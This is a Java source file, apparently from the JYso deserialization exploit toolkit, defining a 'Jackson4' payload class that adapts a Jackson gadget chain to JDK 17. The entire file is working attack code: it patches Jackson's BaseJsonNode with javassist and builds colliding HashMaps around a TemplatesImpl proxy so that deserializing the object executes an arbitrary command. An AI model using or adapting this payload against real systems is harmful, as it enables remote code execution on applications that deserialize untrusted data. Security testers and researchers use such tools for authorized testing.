package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xpath.internal.objects.XObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.util.HashMap;

import static com.qi4l.JYso.gadgets.JDKUtil.makeMap;
import static com.qi4l.JYso.gadgets.Jackson3.makeTemplatesImplAopProxy;


//Jackson1链的JDK17改造
public class Jackson4 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        try {
            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception ignored) {

        }

        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
        XObject                 xString = new XString("foo");
        HashMap<Object, Object> map1    = new HashMap();
        HashMap<Object, Object> map2    = new HashMap();
        map1.put("yy", node);
        map1.put("zZ", xString);
        map2.put("yy", xString);
        map2.put("zZ", node);
        HashMap hashmap = makeMap(map1, map2);
        return hashmap;
    }
}
